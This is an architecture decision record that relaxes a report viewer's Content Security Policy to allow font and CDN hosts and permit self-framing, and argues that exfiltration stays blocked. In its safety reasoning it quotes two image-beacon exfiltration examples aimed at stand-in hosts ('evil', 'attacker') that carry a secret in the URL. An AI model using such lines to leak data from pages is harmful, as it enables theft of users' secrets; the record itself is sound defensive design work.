# ADR-0088: Artifact-parity allowlist on the viewer CSP, and `frame-ancestors 'self'`

- **Status**: Accepted (2026-09-09) — amends ADR-013 (viewer security header stack)
- **Deciders**: operator
- **Date**: 2026-09-09

## Context and problem statement

ADR-013 gives the public viewer (`view.<domain>/<slug>`) a deliberately airtight
enforcing CSP: `default-src 'self'` with every fetch directive pinned to the viewer
origin, paired with a second `sandbox` CSP header that drops the whole top-level
document into an opaque origin. Nothing loads from anywhere but `view.<domain>`.

That policy was written for one threat: a hosted, untrusted, third-party HTML document
used as an exfiltration channel or a phishing page (spec threat #3 and #1). It is
correct about that threat and this ADR does not reopen it.

What it also does — unintentionally — is break the *typical* report. The documents this
platform exists to host are agent-authored, self-contained HTML artifacts, and that genre
has a house style: a `<link>` to Google Fonts for the typeface, and a `<script>` from a
pinned CDN for a chart or a diagram library. Under the ADR-013 policy both are blocked,
silently, at render time. The author sees their deck in the designed typeface locally,
publishes it, and gets a fallback-serif page with a dead chart — with no error surfaced
anywhere the author will look. Reports are therefore *systematically* degraded relative
to the artifact surfaces their authors generated them against, and the degradation is
invisible to the person who could fix it.

Second, `frame-ancestors 'none'` forbids framing the viewer *by anything at all*,
including `view.<domain>` itself. Any viewer-origin surface that wants to render a report
in a frame — a preview pane, a side-by-side, an owner-view frame — is blocked by the
top-level policy, not by any deliberate decision about who may embed a report.

The question this ADR settles: **can the viewer permit the small, named set of external
hosts that artifact parity actually requires, without giving up the property that makes
the viewer safe?**

## Decision drivers

- **Artifact parity.** A report published here should render the way the artifact it was
  generated as renders. Fonts and the two pinned CDNs are what that costs.
- **Exfiltration must stay blocked.** Whatever is relaxed, an untrusted report must not
  gain a channel to send data off-box. That property lives in `connect-src`, not in
  `script-src`.
- **The allowlist must be one reviewable object.** A widened CSP whose hosts are spelled
  out inline in a string, and again in each test, drifts silently. Widening should be a
  visible edit to one named thing.
- **Relax the minimum, and only where a real report is broken today.** Every host added
  is permanent attack surface; "might be useful" is not a driver.
- **The edit-route profile and the report-only shadow are not in scope.** They are a
  separate decision (ADR-0063) and a separate instrument respectively.

## Considered options

1. **Do nothing** — keep ADR-013 as-is; tell authors to inline their fonts and vendor
   their scripts as data URIs.
2. **Fonts only** — allow `https://fonts.googleapis.com` on `style-src` and
   `https://fonts.gstatic.com` on `font-src`; leave `script-src` closed.
3. **Fonts + two pinned script CDNs** (the artifact-parity set) — this ADR's decision.
4. **Fonts + CDNs + `img-src https:`** — also let reports hotlink images from anywhere.
5. **A separate frameable alias path** (e.g. `view.<domain>/embed/<slug>`) carrying its
   own relaxed `frame-ancestors`, leaving `/<slug>` at `'none'`.
6. **Per-report opt-in relaxation** — a paid, abuse-reviewed per-report CSP, as the spec's
   threat table originally sketched for `connect-src`.

## Decision outcome

**Chosen: option 3 — a named artifact-parity allowlist on `style-src`, `font-src` and
`script-src`, plus `frame-ancestors 'self'`.** Everything else in the ADR-013 stack is
unchanged, byte for byte.

The enforcing viewer CSP becomes:

| Directive | Before (ADR-013) | After |
| --- | --- | --- |
| `style-src` | `'self' 'unsafe-inline'` | `'self' 'unsafe-inline' https://fonts.googleapis.com` |
| `font-src` | `'self' data:` | `'self' data: https://fonts.gstatic.com` |
| `script-src` | `'self' 'unsafe-inline'` | `'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net/npm/` |
| `frame-ancestors` | `'none'` | `'self'` |

and `default-src`, `img-src`, `connect-src`, `base-uri`, `form-action`, `object-src`,
`worker-src`, `report-to`, the second `sandbox` CSP header, and every non-CSP header in
the stack (COOP, CORP, `Origin-Agent-Cluster`, Referrer-Policy, Permissions-Policy,
`X-Content-Type-Options`, HSTS, Cache-Control, Report-To) are unchanged.

**Scope: the whole `viewHeaders()` profile, not only the report body.** The relaxation
reaches every response that profile serves — the report itself, the 404/410/451/500/503
error pages, the 302/303 redirects that set the `arp_unlock`/`arp_edit` cookies, the
"Scanning…" interstitial, `/health`, and the `/edit` route's *non-report* responses (its
404, its degrade-redirect and its `?et=` hand-off), which are built with `viewHeaders()`
deliberately. That is acceptable because those bodies are the platform's own static
strings: they reference no external resources, so the allowlist grants them nothing they
use, and `frame-ancestors 'self'` admits only the view origin itself as an embedder. The
ADR-0063 `editViewHeaders()` profile — the one that will serve the editor *document* — is
untouched, carries no allowlist, and keeps `frame-ancestors 'none'`.

**The four hosts are one named constant** — the **Viewer CSP allowlist**
(`VIEW_CSP_ALLOWLIST` in `packages/headers`), keyed by the directive each host belongs to
and exported so the unit tests and the live `security-headers` CI gate assert against the
constant rather than against restated strings. Adding a fifth host is an edit to that one
object, visible in a diff, and reviewable as the security decision it is.

### Why this is safe: `connect-src 'self'` is the load-bearing directive

The relaxation grants the *loading of passive assets from four named hosts*. It grants no
new way to send data anywhere. Concretely, after this change an untrusted report still
cannot:

- `fetch`/`XHR`/`sendBeacon`/`WebSocket` to any origin but `view.<domain>` —
  `connect-src 'self'` is untouched, and it is the directive that governs every
  script-initiated network send. This is what keeps spec threat #3 (hosted JS as
  exfil/C2) mitigated exactly as ADR-013 mitigated it.
- Exfiltrate by *loading* a URL it composes: `img-src 'self' data: blob:` is untouched, so
  the classic `new Image().src = "https://evil/?" + secret` channel stays closed, and the
  allowlisted hosts are fixed strings the report cannot append a query payload to a
  *different* host with.
- Post data out: `form-action 'self'` is untouched.
- Escape into a worker or a plugin: `worker-src 'self'` and `object-src 'none'` untouched.
- Reach the viewer origin's storage, cookies or DOM at all: the second CSP header still
  sandboxes the document into an **opaque origin** with `allow-same-origin` withheld. This
  is the primary containment (ADR-012's layered model: isolation > AV), and script from an
  allowlisted CDN runs inside exactly the same opaque origin as the report's own inline
  script already does — `script-src` widening does not widen the sandbox.

The residual risk is honestly stated: a report may now execute third-party code from
cdnjs or jsDelivr, so a compromise or malicious publish on one of those CDNs becomes code
running in the viewer's sandbox. That code inherits the sandbox's limits — opaque origin,
no cross-origin `connect`, no top-navigation — so its blast radius is the rendering of the
report it was loaded into, not the platform or its data. Both hosts are the mainstream,
SRI-serving, immutably-versioned CDNs the artifact ecosystem already standardizes on; the
alternative (`'unsafe-inline'` scripts, already granted) is not meaningfully safer.

**What "four named hosts" does not mean.** Both CDNs are open registries, not curated
file sets: jsDelivr's `/npm/` prefix resolves *any* published npm package, and cdnjs
serves any library it has indexed. Read the script grant as "arbitrary third-party JS
from two hosts", because that is what it is. The honest marginal risk is therefore a
**supply-chain dependency** on cdnjs and jsDelivr, not a new capability for the report:
`script-src` already carries `'unsafe-inline'`, so a report's author could already run
arbitrary script of their own choosing: what changes is that they can now also run
someone else's. The `/npm/` path is a real narrowing on a direct request — CSP matches a
trailing-slash path segment-wise, so `https://cdn.jsdelivr.net/gh/<any GitHub repo>` is
refused (CSP3 §6.7.2.12). It is not a hard boundary: the path component of a source
expression is enforced only while the redirect count is zero (CSP3 §6.7.2.8 step 3.6 —
§7.6 "Paths and Redirects" drops it deliberately, so that CSP cannot be brute-forced into
a cross-origin path-probing oracle), so a *redirected* script URL is matched on
scheme/host/port alone. Treat `/npm/` as best-effort narrowing, and the host-wide
`cdnjs.cloudflare.com` entry as the honest floor of what this allowlist grants.

### Why `frame-ancestors 'self'` and not `'none'`

`'self'` permits exactly one embedder: `view.<domain>` itself. Clickjacking a report into
an attacker's page stays impossible — the dashboard origin `app.<domain>` is a *different*
origin and is also refused. What it buys is that the viewer origin may build
report-in-a-frame surfaces of its own. `'none'` was never a decision about self-framing;
it was the strictest available default at a time when nothing framed anything.

#### Evidence

CI cannot prove this negatively — a green header assertion says the string is served, not
that a browser enforces it — so it was checked by hand. **Manual browser check (operator,
2026-09-10, Chromium 148):**

- A sandboxed report (opaque origin) that iframes *another* report on the view origin is
  **blocked**, with `Framing violates frame-ancestors 'self'`. Independently of the CSP,
  that iframe navigation carries no `SameSite=Lax` unlock cookie, so a passphrase-gated
  report is refused a second time on its own merits.
- A first-party page on the view origin **does** frame the report, and its navigation does
  carry the cookie — i.e. the property this ADR is buying actually exists.

The browser-tier regression test that locks both halves in (ADR-0079, `pnpm test:browser`)
lands with the owner view ticket #361; this note is the interim record, not a substitute
for it.

### Rejected alternatives

- **(1) Do nothing.** Rejected: it makes the platform's core artifact worse than the
  surface it was authored on, and pushes every author into inlining fonts by hand. The
  cost of the status quo is paid on every report, forever; the cost of this ADR is four
  named hosts.
- **(2) Fonts only.** The tempting half-measure — fonts are passive data, scripts are code,
  so stopping at fonts looks like the conservative line. Rejected because it does not
  actually deliver the driver: the chart and diagram libraries are exactly what breaks in
  the reports this platform is for, and the sandbox already runs report-authored script,
  so the marginal grant is "code from two pinned hosts" rather than "code, at last".
  Fonts-only would leave us relaxing the CSP again in a month, with no ADR budget saved.
- **(4) Also `img-src https:`.** Rejected — and this is the important rejection. A
  wildcard `img-src` is an **exfiltration channel**: a report composes
  `https://attacker/collect?d=<secret>` as an image `src`, the browser issues the request,
  and the data is gone. It defeats `connect-src 'self'` without ever using `connect`. The
  whole safety argument above rests on every *outbound* directive staying pinned, so
  `img-src` stays `'self' data: blob:`.
- **(5) A separate frameable alias path.** Rejected as more moving parts than the problem
  has: a second route, a second header profile and a second thing to keep in sync, to
  express what `'self'` expresses in one token. It would also fork the canonical URL
  (ADR-0038), which is the one thing the viewer's URL contract must not do.
- **(6) Per-report opt-in.** Rejected *for this change*, not in general. It is the right
  shape for genuinely dangerous relaxations (a report that needs real `connect-src`), and
  the spec's threat table already reserves it for that. Building the opt-in machinery —
  per-report policy storage, an abuse-review step, a billing gate — to deliver Google
  Fonts to every report would be inverted cost. If `connect-src` is ever relaxed, it goes
  through this door, not through the allowlist.

## More information

- Amends **ADR-013** (viewer security header stack). ADR-013 stays Accepted; this record
  is the amendment, and the spec's Layer 4 entry (`docs/spec.html`) is synced in this same
  change, so the contract and the shipped header agree. **ADR-0063** carries a dated
  amendment note pointing here, since the two viewer profiles no longer share `style-src`,
  `font-src` or `frame-ancestors`.
- Related: **ADR-002/ADR-0038** (viewer on its own origin — the isolation this relies on),
  **ADR-012** (the layered model: origin isolation + sandbox is the primary containment),
  **ADR-0063** (the `/edit` profile, explicitly out of scope and unchanged here).
- Implementation: `packages/headers/src/view-headers.ts` — `VIEW_CSP_ALLOWLIST` is the
  named allowlist; `viewHeaders()` composes it into the enforcing policy only. The
  report-only shadow policy (`Content-Security-Policy-Report-Only`) deliberately stays
  strict, so violations against the *old* policy keep being reported and we can see what
  reports actually reach for.
- Verified by `packages/headers/src/view-headers.test.ts` (unit, asserts against the
  exported constant) and `packages/headers/src/view-headers.live.test.ts` (the
  `security-headers` CI gate, which probes the served header on a preview deploy and so
  catches an edge layer rewriting it).
- New glossary term: **Viewer CSP allowlist** (`docs/domain-glossary.md`, Cross-cutting
  infrastructure).
